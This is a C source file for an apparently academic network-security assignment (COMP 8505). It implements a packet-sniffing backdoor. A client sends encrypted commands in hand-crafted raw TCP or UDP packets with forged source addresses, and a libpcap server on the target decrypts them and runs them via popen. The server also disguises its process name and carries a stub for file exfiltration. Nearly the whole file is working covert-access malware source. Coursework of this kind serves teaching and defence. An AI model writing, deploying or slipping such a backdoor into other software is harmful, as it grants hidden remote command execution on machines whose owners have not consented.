/*
| ------------------------------------------------------------------------------
| File:     bd.c
| Purpose:  COMP 8505 Assignment 2
| Authors:  Kevin Eng, Jeremy Tsang
| Date:     Oct 6, 2014
| 
| Notes:    A packet-sniffing backdoor in C. This program includes the client
|           and server together as one main executable.
|
|           Compile using 'make clean' and 'make'.
|
|           Usage: ./backdoor -h
| 
| ------------------------------------------------------------------------------
*/

/*
| ------------------------------------------------------------------------------
| Headers
| ------------------------------------------------------------------------------
*/

#include "bd.h"

/*
| ------------------------------------------------------------------------------
| Main Function
| ------------------------------------------------------------------------------
*/

int main(int argc, char **argv){
    
    /* Raise privileges */
    
    setuid(0);
    setgid(0);

    /* Parse arguments */
    
    int is_server = 0;
    struct client_opt c_opt;
    c_opt.target_host[0] = '\0';
    c_opt.command[0] = '\0';
    c_opt.target_port = 0;
    c_opt.protocol = 0;
    struct server_opt s_opt;
    s_opt.device[0] = '\0';
    s_opt.protocol = 0;
    
    int opt;
    while((opt = getopt(argc, argv, "hsc:d:p:ux:")) != -1){
        switch(opt){
            case 'h':
                usage();
                return 0;
                break;
            case 's':
                is_server = 1;
                break;
            case 'c':
                strcpy(s_opt.device, optarg);
                break;
            case 'd':
                strcpy(c_opt.target_host, optarg);
                break;
            case 'p':
                c_opt.target_port = atoi(optarg);
                break;
            case 'u':
                c_opt.protocol = 1;
                s_opt.protocol = 1;
                break;
            case 'x':
                strcpy(c_opt.command, optarg);
                break;
            default:
                printf("Type -h for usage help.\n");
                return 1;
        }
    }
    
    /* Mask process name */
    
    mask_process(argv, PROCESS_NAME);

    /* Validation then run client or server */
    
    if(is_server){
        if(s_opt.device[0] == '\0'){
            printf("Type -h for usage help.\n");
            return 1;
        }
        else{
            server(s_opt);
	    
        }
    }
    else{
        if(c_opt.target_host[0] == '\0' || c_opt.command[0] == '\0' || c_opt.target_port == 0){
            printf("Type -h for usage help.\n");
            return 1;
        }
        else{
            client(c_opt);
        }
    }
    
    return 0;
}

/*
| ------------------------------------------------------------------------------
| Client
| ------------------------------------------------------------------------------
*/

void client(struct client_opt c_opt){

    /* Display options */

    printf("Running client...\n");
    printf("Target Host: %s\n",c_opt.target_host);
    printf("Target Port: %d\n",c_opt.target_port);
    if(c_opt.protocol == 1)
        printf("Protocol: UDP\n");
    else
        printf("Protocol: TCP\n");
    printf("Command: %s\n",c_opt.command);
    
    /* Encrypt command */
    
    char *bd_message;
    int bd_message_len;
    bd_message = bd_encrypt(c_opt.command, &bd_message_len);
    if(bd_message == NULL){
        return;
    }
    
    /* Set packet options and send packet */
    
    struct addr_info user_addr;
    user_addr.shost = DEFAULT_SRC_IP;
    user_addr.sport = DEFAULT_SRC_PORT;
    user_addr.dhost = c_opt.target_host;
    user_addr.dport = c_opt.target_port;
    user_addr.raw_socket = 0;
    
    // Create a raw socket and set SO_REUSEADDR
    if(c_opt.protocol == 1)
        user_addr.raw_socket = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    else
        user_addr.raw_socket = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    
    int arg = 1;
    if(setsockopt(user_addr.raw_socket, SOL_SOCKET, SO_REUSEADDR, &arg, sizeof(arg)) == -1)
        system_fatal("setsockopt");
    
    // Send packet
     if(c_opt.protocol == 1)
        send_udp_datagram(&user_addr, bd_message, bd_message_len);
    else
        send_tcp_datagram(&user_addr, bd_message, bd_message_len);
    
    /* Receive reply and print */
    
    printf("Waiting for reply...\n");
    
    // Initialize variables    
    int sockfd, n;
    struct sockaddr_in server, client;
    memset(&server, 0, sizeof(struct sockaddr_in));
    memset(&client, 0, sizeof(struct sockaddr_in));
    
    // Create UDP socket
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    arg = 1;
    if(setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &arg, sizeof(arg)) == -1)
        system_fatal("setsockopt");
    
    // Setup server info and bind
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = htonl(INADDR_ANY);
    server.sin_port = htons(DEFAULT_SRC_PORT);
    bind(sockfd, (struct sockaddr *)&server, sizeof(server));
    
    // Receive UDP packet and print results
    char reply[BD_MAX_REPLY_LEN];
    memset(reply, 0, BD_MAX_REPLY_LEN);
    socklen_t client_len = sizeof(client);
    n = recvfrom(sockfd, reply, sizeof(reply), 0, (struct sockaddr *)&client, &client_len);
    reply[n] = 0;
    printf("Reply: \n");
    printf("%s\n", reply);
    
    /* Cleanup */
    
    free(bd_message);
    close(sockfd);
}

/*
| ------------------------------------------------------------------------------
| Server
| ------------------------------------------------------------------------------
*/

void server(struct server_opt s_opt){

    printf("Running server...\n");
    if(s_opt.protocol == 1)
        printf("Protocol: UDP\n");
    else
        printf("Protocol: TCP\n");
    
    /* Initialize variables and functions */
    
    pcap_t *handle;                 /* Session handle */
    char *dev;                      /* The device to sniff on */
    char errbuf[PCAP_ERRBUF_SIZE];  /* Error string */
    struct bpf_program fp;          /* The compiled filter */
    char filter_exp[] = "port 12345"; /* The filter expression */
    bpf_u_int32 mask;               /* Our netmask */
    bpf_u_int32 net;                /* Our IP */
    
    // Get network interface
    dev = s_opt.device; //dev = "wlp4s5"; //dev = pcap_lookupdev(errbuf);
    if(dev == NULL) {
        printf("Couldn't find default device: %s\n", errbuf);
        system_fatal("pcap_lookupdev");
    }
    printf("Device: %s\n", dev);
    
    // Get interface properties
    if(pcap_lookupnet(dev, &net, &mask, errbuf) == -1){
        fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
        net = 0;
        mask = 0;
    }
    
    // Open sniffing session
    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if(handle == NULL) {
        fprintf(stderr, "Couldn't open device: %s\n", errbuf);
        system_fatal("pcap_open_live");
    }
    
    /* Build packet filter */
    
    // Compile filter
    if(pcap_compile(handle, &fp, filter_exp, 0, net) == -1){
        fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
        system_fatal("pcap_compile");
    }
    
    // Apply filter
    if(pcap_setfilter(handle, &fp) == -1){
        fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
        system_fatal("pcap_setfilter");
    }
    printf("Filter: %s\n", filter_exp);
    
    /* Packet capture loop */
    
    // Grab a packet
    //packet = pcap_next(handle, &header);

    // Close the session
    //pcap_close(handle);

    // Packet capture loop
    printf("Capturing...\n");
    pcap_loop(handle, -1, packet_handler, (u_char *)&s_opt);
}

/*
| ------------------------------------------------------------------------------
| Send Raw TCP Packet
| ------------------------------------------------------------------------------
*/

int send_tcp_datagram(struct addr_info *user_addr, char *data, int data_len){
    
    /* Declare variables */
    
    // Typecast datagram
    char datagram[PKT_SIZE];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));
    char *data_ptr = (char *)(datagram + sizeof(struct iphdr) + sizeof(struct tcphdr));
    
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(user_addr->dport);
    sin.sin_addr.s_addr = inet_addr(user_addr->dhost);
    
    pseudo_tcp_header psh;
    
    // Zero out the buffer where the datagram will be stored
    memset(datagram, 0, PKT_SIZE);

    /* IP header */

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons((short)(sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len));
    iph->id = htons(DEFAULT_IP_ID);
    iph->frag_off = 0;
    iph->ttl = DEFAULT_TTL;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0; // Initialize to zero before calculating checksum
    iph->saddr = inet_addr(user_addr->shost);
    iph->daddr = inet_addr(user_addr->dhost);
 
    iph->check = csum((unsigned short *) datagram, iph->tot_len >> 1);
 
    /* TCP header */
    
    tcph->source = htons(user_addr->sport);
    tcph->dest = htons(user_addr->dport);
    tcph->seq = 1487534554;
    tcph->ack_seq = 0;
    tcph->doff = 5; // Data Offset is set to the TCP header length 
    tcph->fin = 0;
    tcph->syn = 1;
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->urg = 0;
    tcph->window = htons(WIN_SIZE);
    tcph->check = 0; // Initialize the checksum to zero (kernel's IP stack will fill in the correct checksum during transmission)
    tcph->urg_ptr = 0;
   
    /* Data */
    
    memcpy(data_ptr, data, data_len);
      
    /* Calculate Checksum */
    
    psh.source_address = inet_addr(user_addr->shost);
    psh.dest_address = inet_addr(user_addr->dhost);
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr) + data_len);
    memcpy(&psh.tcp, tcph, sizeof(struct tcphdr));
    psh.data = data;
    
    tcph->check = csum((unsigned short*)&psh, sizeof(pseudo_tcp_header));
 
    /* Build our own header */
    
    {
        int one = 1;
        const int *val = &one;
        if (setsockopt (user_addr->raw_socket, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
            system_fatal("setsockopt");
    }
 
    /* Send the packet */
    
    if(sendto(user_addr->raw_socket, datagram, ntohs(iph->tot_len), 0, (struct sockaddr *)&sin, sizeof(sin)) < 0){
        system_fatal("sendto");
        return -1;
    }
    else{
        printf("Sent TCP Packet with command!\n");
        return 0;
    }
}

/*
| ------------------------------------------------------------------------------
| Send Raw UDP Packet (Duplicate of send_tcp_datagram() above)
| ------------------------------------------------------------------------------
*/

int send_udp_datagram(struct addr_info *user_addr, char *data, int data_len){
    
    /* Declare variables */
    
    // Typecast datagram
    char datagram[PKT_SIZE];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct udphdr *udph = (struct udphdr *)(datagram + sizeof(struct iphdr));
    char *data_ptr = (char *)(datagram + sizeof(struct iphdr) + sizeof(struct udphdr));
    
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(user_addr->dport);
    sin.sin_addr.s_addr = inet_addr(user_addr->dhost);
    
    pseudo_udp_header psh;
    
    // Zero out the buffer where the datagram will be stored
    memset(datagram, 0, PKT_SIZE);

    /* IP header */

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons((short)(sizeof(struct iphdr) + sizeof(struct udphdr) + data_len));
    iph->id = htons(DEFAULT_IP_ID);
    iph->frag_off = 0;
    iph->ttl = DEFAULT_TTL;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0; // Initialize to zero before calculating checksum
    iph->saddr = inet_addr(user_addr->shost);
    iph->daddr = inet_addr(user_addr->dhost);
 
    iph->check = csum((unsigned short *) datagram, iph->tot_len >> 1);
 
    /* UDP header */
    
    udph->source = htons(user_addr->sport);
    udph->dest = htons(user_addr->dport);
    udph->len = htons((short)(sizeof(struct udphdr) + data_len));
    udph->check = 0; // Initialize the checksum to zero
   
    /* Data */
    
    memcpy(data_ptr, data, data_len);
      
    /* Calculate Checksum */
    
    psh.source_address = inet_addr(user_addr->shost);
    psh.dest_address = inet_addr(user_addr->dhost);
    psh.placeholder = 0;
    psh.protocol = IPPROTO_UDP;
    psh.udp_length = htons(sizeof(struct udphdr) + data_len);
    memcpy(&psh.udp, udph, sizeof(struct udphdr));
    psh.data = data;
    
    udph->check = csum((unsigned short*)&psh, sizeof(pseudo_udp_header));
 
    /* Build our own header */
    
    {
        int one = 1;
        const int *val = &one;
        if (setsockopt (user_addr->raw_socket, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
            system_fatal("setsockopt");
    }
 
    /* Send the packet */
    
    if(sendto(user_addr->raw_socket, datagram, ntohs(iph->tot_len), 0, (struct sockaddr *)&sin, sizeof(sin)) < 0){
        system_fatal("sendto");
        return -1;
    }
    else{
        printf("Sent UDP Packet with command!\n");
        return 0;
    }
}

/*
| ------------------------------------------------------------------------------
| Packet Handler Function
| ------------------------------------------------------------------------------
*/

void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet){
    
    struct server_opt *s_opt_ptr = (struct server_opt *)args;
    
    printf("\n");
    printf("Got packet...\n");
    
    /* Parse packet */
    
    // Get packet info
    struct parsed_packet packet_info = {0}; // Initialize with 0
    if(packet_typecast(packet, &packet_info) == 0){
        printf("packet_typecast");
        return;
    }
    
    /* Decrypt remaining packet data */
    
    short payload_len = 0;
    if(packet_info.ip->ip_p == IPPROTO_UDP){
        payload_len = ntohs(packet_info.ip->ip_len) - sizeof(struct iphdr) - sizeof(struct udphdr);
    }
    else if(packet_info.ip->ip_p == IPPROTO_TCP){
        payload_len = ntohs(packet_info.ip->ip_len) - sizeof(struct iphdr) - sizeof(struct tcphdr);
    }
    
    //printf("payload_len: %d\n",payload_len);
    char *bd_command;
    bd_command = bd_decrypt((char *)packet_info.payload, payload_len);
    if(bd_command == NULL){
        return;
    }
    
    /* Handle command */
    
    // If file exfil command
    if(strncmp(bd_command,"EXFIL:",6) == 0){
        printf("EXFIL");
    }
    else{ // Normal command
        
        /* Execute command */
    
        FILE *fp;
        fp = popen(bd_command, "r");
        if(fp == NULL){
            printf("Command error!\n");
            return;
        }
        printf("Command executed.\n");
        
        //server_command(bd_command, &dst_host);
    }
    
    /* Get destination port from packet based on TCP or UDP
       Create a raw socket and set SO_REUSEADDR */
    
    u_short dport = 0; // Destination port is the source port of the packet
    u_short sport = 0; // Source port is the destination port of the packet
    int skt;
    if(packet_info.ip->ip_p == IPPROTO_UDP){
        dport = packet_info.udp->uh_sport;
        sport = packet_info.udp->uh_dport;
        skt = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    }
    else if(packet_info.ip->ip_p == IPPROTO_TCP){
        dport = packet_info.tcp->th_sport;
        sport = packet_info.tcp->th_dport;
        skt = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    }
    
    int arg = 1;
    if(setsockopt(skt, SOL_SOCKET, SO_REUSEADDR, &arg, sizeof(arg)) == -1)
        system_fatal("setsockopt");
    
    /* Get host IP from interface */
    
    struct ifreq ifr;
    size_t if_name_len = strlen(s_opt_ptr->device);
    if (if_name_len < sizeof(ifr.ifr_name)) {
        memcpy(ifr.ifr_name, s_opt_ptr->device, if_name_len);
        ifr.ifr_name[if_name_len] = 0;
    }
    else {
        printf("Interface name is too long");
        return;
    }
    
    if(ioctl(skt,SIOCGIFADDR, &ifr) == -1) {
        int temp_errno=errno;
        close(skt);
        printf("%s",strerror(temp_errno));
        return;
    }
    
    // Cast to sockaddr_in and extract sin_addr
    struct sockaddr_in* hostaddr = (struct sockaddr_in*)&ifr.ifr_addr;
    printf("IP address: %s\n",inet_ntoa(hostaddr->sin_addr));
    
    /* Prepare destination sockaddr_in */
    
    struct sockaddr_in dst_host;
    
    memset(&dst_host, 0, sizeof(struct sockaddr_in));
    dst_host.sin_family = AF_INET;
    dst_host.sin_addr.s_addr = packet_info.ip->ip_src.s_addr;
    dst_host.sin_port = dport;
    
    /* Prepare address info structure for raw packet crafting */
    
    struct addr_info server_addr;
    server_addr.shost = inet_ntoa(hostaddr->sin_addr);
    server_addr.sport = sport;
    server_addr.dhost = inet_ntoa(packet_info.ip->ip_src);
    server_addr.dport = dport;
    server_addr.raw_socket = skt;
    
    printf("shost: %s\n", server_addr.shost);
    printf("dhost: %s\n", server_addr.dhost);
    printf("sport: %d\n", server_addr.sport);
    printf("dport: %d\n", server_addr.dport);
    
    char test[] = "nexus";
            
    // Send packet
    if(s_opt_ptr->protocol == 1)
        send_udp_datagram(&server_addr, test, sizeof(test));
    else
        send_tcp_datagram(&server_addr, test, sizeof(test));
    
    /* Send results back to client */
    
    /*// Open UDP socket
    int sockfd;
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    int arg = 1;
    if(setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &arg, sizeof(arg)) == -1)
        system_fatal("setsockopt");
    
    // Send results from popen command
    char output[BD_MAX_REPLY_LEN];
    memset(output, 0, BD_MAX_REPLY_LEN);
    fread((void *)output, sizeof(char), BD_MAX_REPLY_LEN, fp);
    sendto(sockfd, output, strlen(output), 0, (struct sockaddr *)dst_host, sizeof(struct sockaddr_in));
    printf("Sent results back to client.\n");
    
    // Cleanup
    free(bd_command);
    close(sockfd);
    pclose(fp);*/
}

/*
| ------------------------------------------------------------------------------
| Execute command
| ------------------------------------------------------------------------------
*/

void server_command(char *bd_command, struct sockaddr_in *dst_host){
    
    
    
    
}

/*
| ------------------------------------------------------------------------------
| Mask process under daemon
| ------------------------------------------------------------------------------
*/

void mask_process(char *argv[], char *name){
    
    memset(argv[0], 0, strlen(argv[0]));
    strcpy(argv[0], name);
    prctl(PR_SET_NAME, name, 0, 0);
}

/*
| ------------------------------------------------------------------------------
| Usage printout
| ------------------------------------------------------------------------------
*/

void usage(){
    
    printf("\n");
    printf("COMP 8505 Final Project - Packet Sniffing Backdoor\n");
    printf("Usage: ./backdoor [OPTIONS]\n");
    printf("---------------------------\n");
    printf("  -h                    Display this help.\n");
    printf("  -u                    Use UDP instead of TCP (TCP is default).\n");
    printf("CLIENT (default)\n");
    printf("  -d <target_host>      The target host where the backdoor server is running.\n");
    printf("  -p <target_port>      The target port to send to.\n");
    printf("  -x <command>          The command to run on the target host.\n");
    printf("SERVER\n");
    printf("  -s                    Enables server mode.\n");
    printf("  -c <device_name>      Network interface device name.\n");
    printf("\n");
}

/*
| ------------------------------------------------------------------------------
| Fatal error
| ------------------------------------------------------------------------------
*/

// Prints the error stored in errno and aborts the program.
static void system_fatal(const char* message) {
    perror(message);
    exit(EXIT_FAILURE);
}
